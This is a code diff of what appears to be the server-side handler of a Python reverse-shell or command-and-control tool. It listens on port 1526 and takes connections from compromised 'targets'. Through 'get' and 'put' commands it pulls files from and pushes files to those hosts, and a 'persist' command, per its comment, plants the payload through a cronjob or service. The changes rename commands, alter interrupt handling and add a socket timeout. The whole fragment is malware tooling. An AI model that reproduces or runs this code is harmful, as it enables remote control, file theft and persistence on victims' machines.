@@ -41,8 +41,10 @@ def shell(target, ip):
             try:
                 data = data + target.recv(1024)
                 return json.loads(data)
+		
 	    except KeyboardInterrupt:
-	        continue
+	        break
+		
             except ValueError:
                 continue
 
@@ -62,15 +64,15 @@ def shell(target, ip):
                 ips.remove(ip)
                 break
 
-            elif command_input[:8] == "download":  # download file. will be using b64
-                location = (base_dir + "/" + command_input[9:])
+            elif command_input[:3] == "get":  # download file. will be using b64
+                location = (base_dir + "/" + command_input[4:])
                 with open(location, "wb") as file:
                     file_data = receive()
                     file.write(base64.b64decode(file_data))
                     print ("File was successfully downloaded at %s " % location)
 
-            elif command_input[:6] == "upload":  # upload file. will be using b64
-                with open(command_input[7:], "rb") as uload:
+            elif command_input[:3] == "put":  # upload file. will be using b64
+                with open(command_input[4:], "rb") as uload:
                     send(base64.b64encode(uload.read()))
 
             elif command_input == "persist":  # will attempt to persist payload via cronjob or service
@@ -126,6 +128,7 @@ if __name__ == "__main__":
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind(("0.0.0.0", 1526))  # server bind.  TODO. will make these arguments variables
+    s.settimeout(2)
     s.listen(5)
 
     stop_threads = False
